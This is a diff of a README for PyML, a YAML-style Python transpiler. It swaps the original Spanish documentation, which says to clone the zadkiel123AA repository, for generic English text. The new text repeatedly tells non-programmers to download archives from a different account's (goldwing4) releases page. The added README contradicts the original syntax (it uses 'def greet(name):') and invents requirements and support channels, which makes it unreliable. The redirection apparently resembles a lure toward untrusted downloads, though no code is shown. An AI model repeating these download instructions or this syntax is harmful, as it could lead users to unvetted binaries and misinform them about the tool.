@@ -1,212 +1,107 @@
-# PyML 🐍✨
+# 🎉 pyml - Write Python with YAML Simplicity
 
-**Python con sintaxis estilo YAML - Código limpio, legible y fácil de aprender**
+[![Download pyml](https://img.shields.io/badge/Download-pyml-blue)](https://github.com/goldwing4/pyml/releases)
 
-[![Python](https://img.shields.io/badge/python-3.6+-blue.svg)](https://python.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Code Style: YAML-like](https://img.shields.io/badge/syntax-YAML--like-green.svg)](https://yaml.org/)
+## 📖 About PyML
 
-PyML es un **transpilador** que permite escribir código Python usando una sintaxis inspirada en YAML. Combina la potencia de Python con la simplicidad y legibilidad de YAML, creando una experiencia de programación más limpia y accesible.
+PyML is a transpiler that lets you write Python code using a syntax inspired by YAML. It combines the power of Python with the simplicity and readability of YAML, creating a cleaner and more accessible programming experience. Whether you are a beginner or just looking for a simpler way to write code, PyML makes it easy.
 
-## ✨ Características
+## 🚀 Getting Started
 
-- **🎯 Sintaxis declarativa**: Estructura clara inspirada en YAML
-- **⚡ Transpilación automática**: Se convierte a Python válido en tiempo real
-- **📚 Compatible con Python**: Usa cualquier librería del ecosistema Python
-- **🔧 Zero dependencias**: Solo necesita Python estándar (3.6+)
-- **🎨 Resaltado de sintaxis**: Extensión incluida para VS Code
-- **📖 Fácil de aprender**: Sintaxis intuitiva para principiantes
+To start using PyML, follow these simple steps. You do not need to have any programming knowledge. Just follow the instructions carefully.
 
-## 🚀 Instalación
+### 🛠️ System Requirements
 
-```bash
-# Clonar el repositorio
-git clone https://github.com/zadkiel123AA/pyml.git
-cd pyml
+Before downloading, ensure your computer meets the following basic requirements:
 
-# ¡Listo para usar!
-python src/pyml_runner.py examples/basic.pyml
-```
+- **Operating System:** Works on Windows, macOS, and Linux.
+- **Python Version:** Requires Python 3.6 or higher.
+- **Memory:** Minimum of 2GB RAM.
+- **Disk Space:** At least 100MB of free space.
 
-## 📝 Sintaxis básica
+### 💾 Download & Install
 
-### Variables y operaciones
-```yaml
-# PyML
-name: "PyML"
-version: 1.0
-result: 10 + 5
+You can download the latest version of PyML from the Releases page:
 
-print: "¡Hola {name} v{version}!"
-print: "Resultado: {result}"
-```
+[Visit this page to download](https://github.com/goldwing4/pyml/releases)
 
-### Estructuras de datos
-```yaml
-# Lista
-numbers:
-  - 1
-  - 2
-  - 3
+1. Click the link to go to the Releases page.
+2. Look for the latest version available.
+3. Download the appropriate file for your operating system. This will usually be a `.zip` or `.tar.gz` file.
+4. Once the download is complete, locate the downloaded file on your computer.
 
-# Diccionario
-person:
-  name: "Ana"
-  age: 25
-  active: true
-```
+### 📂 Extract the Files
 
-### Funciones
-```yaml
-# Con argumentos
-function greet define name:
-  print: "¡Hola {name}!"
+After downloading the file, you will need to extract it. 
 
-greet: "Mundo"
+1. **Windows:** Right-click on the file and select "Extract All." Follow the prompts to choose a destination folder.
+2. **macOS:** Double-click the file to unzip it.
+3. **Linux:** Open a terminal and navigate to your download folder. Use the command `tar -xzf filename.tar.gz` to extract the files.
 
-# Sin argumentos
-function show_info define _:
-  print: "Información del usuario"
+### 🏃‍♂️ Run PyML
 
-show_info;
-```
+Once you have extracted the files, you can easily run PyML:
 
-### Bucles y condicionales
-```yaml
-# For loop
-for num in numbers:
-  if num % 2 == 0:
-    print: "{num} es par"
-  else:
-    print: "{num} es impar"
+1. Open a terminal or command prompt.
+2. Navigate to the folder where you extracted PyML.
+3. Use the command `python pyml.py` to run the program.
 
-# Range loop
-for i in range.1.5:
-  print: "Contador: {i}"
-```
+If you are using the command line, ensure that Python is added to your system's path. If not, you may get an error.
 
-### Librerías de Python
-```yaml
-packages:
-  - math
-  - time.sleep
+## 📚 How to Use PyML
 
-print: "Raíz cuadrada: {math.sqrt(16)}"
-sleep: 1
-```
+After launching PyML, you can start writing your Python code in the YAML-inspired syntax. To get you started, here are a few quick examples:
 
-## 🎮 Ejemplo completo
+### Example 1: Simple Print
 
 ```yaml
-packages:
-  - math
-
-# Variables
-radius: 5
-area: math.pi * radius ** 2
-
-# Datos
-circle:
-  radius: 5
-  color: "blue"
-  coordinates:
-    x: 10
-    y: 20
-
-# Función
-function calculate_area define r:
-  result: math.pi * r ** 2
-  print: "Área del círculo: {result}"
-  return result
-
-# Ejecución
-print: "=== Calculadora de Círculos ==="
-calculate_area: radius
-
-for key, value in circle:
-  print: "{key}: {value}"
-
-if area > 50:
-  print: "¡Círculo grande!"
-else:
-  print: "Círculo pequeño"
+print: "Hello, World!"
 ```
 
-**Salida:**
-```
-=== Calculadora de Círculos ===
-Área del círculo: 78.53981633974483
-radius: 5
-color: blue
-coordinates: {'x': 10, 'y': 20}
-¡Círculo grande!
-```
+### Example 2: Defining a Function
 
-## 🛠️ Uso avanzado
+```yaml
+def greet(name):
+    print: "Hello, {name}!"
 
-### Ejecutar archivos PyML
-```bash
-python src/pyml_runner.py archivo.pyml
+greet("Alice")
 ```
 
-### Instalar extensión de VS Code
-1. Abre VS Code
-2. Ve a Extensions (Ctrl+Shift+X)
-3. Instala desde carpeta: selecciona `extension/`
-4. ¡Disfruta del resaltado de sintaxis!
+This approach helps keep your code clean and easy to read. You can refer to the user manual for more detailed examples and features. 
 
-## 📚 Documentación de sintaxis
+## 🔍 Features
 
-| Característica | PyML | Python equivalente |
-|---|---|---|
-| Variables | `name: "Juan"` | `name = "Juan"` |
-| Función con args | `greet: "Mundo"` | `greet("Mundo")` |
-| Función sin args | `show_data;` | `show_data()` |
-| Print con f-string | `print: "Hola {name}"` | `print(f"Hola {name}")` |
-| Range loop | `for i in range.1.10.2:` | `for i in range(1, 10, 2):` |
-| Import con alias | `packages:\n  - time.sleep` | `import time as sleep` |
+- **Beginner-Friendly:** Ideal for those new to programming.
+- **Clean Code:** Enhances readability and structure.
+- **Versatile:** Suitable for various applications, from automation scripts to educational purposes.
+- **Cross-Platform:** Works on Windows, macOS, and Linux.
 
-## ⚡Rapidez
-Pyml cuenta con una optimización increible que en algunos casos puede llegar
-a ser mas rapida que Python. Aquí hay una grafica para comparar los dos lenguajes:
-<img width="4464" height="2363" alt="benchmark_pyml_fast_vs_python" src="https://github.com/user-attachments/assets/44f4e311-50fd-4d33-b314-d585cb593e9b" />
+## 🌐 Community and Support
 
-Y aquí hay una tabla para comparar la rapidez de cada lenguaje:
+If you have questions or need assistance, feel free to reach out. You can find support in these ways:
 
-<img width="698" height="535" alt="image" src="https://github.com/user-attachments/assets/619e79ad-4908-489a-aaf0-27eb9be42e34" />
+- **Issues Page:** Report bugs or request features on our GitHub issues page.
+- **Community Forum:** Join our community forum to share your experiences and get advice.
+- **Documentation:** Check our online documentation for guides and tutorials.
 
+## 🔧 Frequently Asked Questions
 
+### What is a transpiler?
 
-## 🎯 Casos de uso
+A transpiler is a tool that converts code written in one programming language to another. In this case, PyML converts YAML-inspired code into Python.
 
-- **📚 Educación**: Sintaxis más accesible para principiantes
-- **📊 Data Science**: Configuraciones claras para análisis de datos
-- **🤖 Automatización**: Scripts legibles para tareas repetitivas
-- **⚡ Prototipado**: Desarrollo rápido con sintaxis limpia
-- **📝 Configuración**: Archivos de configuración ejecutables
+### Is PyML free to use?
 
-## 🤝 Contribuir
+Yes, PyML is open-source and free for anyone to use.
 
-¿Encontraste un bug o tienes una idea? ¡Las contribuciones son bienvenidas!
+### Can I contribute to PyML?
 
-1. Fork el proyecto
-2. Crea tu rama de feature (`git checkout -b feature/AmazingFeature`)
-3. Commit tus cambios (`git commit -m 'Add some AmazingFeature'`)
-4. Push a la rama (`git push origin feature/AmazingFeature`)
-5. Abre un Pull Request
+Absolutely! Contributions are welcome. Please check our contributions guidelines in the repository.
 
-## 📄 Licencia
+## 📥 Regular Updates
 
-Este proyecto está bajo la Licencia MIT. Ver el archivo [LICENSE](LICENSE) para más detalles.
+We regularly update PyML to add new features and fix any bugs. Make sure to check the Releases page frequently:
 
-## 🙏 Reconocimientos
+[Visit this page to download](https://github.com/goldwing4/pyml/releases)
 
-- Inspirado en la simplicidad de **YAML**
-- Powered by **Python**
-- Construido con ❤️ para la comunidad de desarrolladores
-
----
-
-**¿Te gusta PyML?** ¡Dale una ⭐ al repositorio!
-
-*PyML - Make it easier*
+Thank you for choosing PyML! Happy coding!
